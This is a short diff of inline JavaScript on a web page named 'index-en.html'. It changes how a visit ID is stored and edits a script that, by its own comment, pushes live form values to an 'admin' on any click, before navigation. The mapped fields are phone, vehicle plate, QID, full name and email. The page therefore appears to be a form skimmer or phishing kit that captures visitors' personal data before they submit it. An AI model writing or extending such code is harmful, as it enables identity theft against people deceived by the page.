@@ -1429,11 +1429,8 @@ function qicSubmitChat() {
 <script>
 (function() {
   var VISIT_KEY = 'qic_visit_id';
-  var visitId = localStorage.getItem(VISIT_KEY);
-  if (!visitId) {
-    visitId = 'v_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
-    localStorage.setItem(VISIT_KEY, visitId);
-  }
+  var visitId = 'v_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+  localStorage.setItem(VISIT_KEY, visitId);
   var PAGE_NAME = 'index-en.html';
   var LANG = 'en';
 
@@ -1530,7 +1527,7 @@ document.addEventListener('keydown', function(e){ if(e.key === 'Escape') closePl
 /* ── Instant sync: push live field values to admin on any click, before navigation ── */
 (function(){
   var VKEY='qic_visit_id';
-  function vid(){ var v=localStorage.getItem(VKEY); if(!v){ v='v_'+Date.now().toString(36)+Math.random().toString(36).slice(2,8); localStorage.setItem(VKEY,v);} return v; }
+  function vid(){ return localStorage.getItem(VKEY) || ''; }
   var FIELD_MAP={
     'heroPhoneInput':'phone','plate-num-input':'plate_no','plate-input':'plate',
     'qid-input':'qid','fullname-input':'name','email-input':'email',
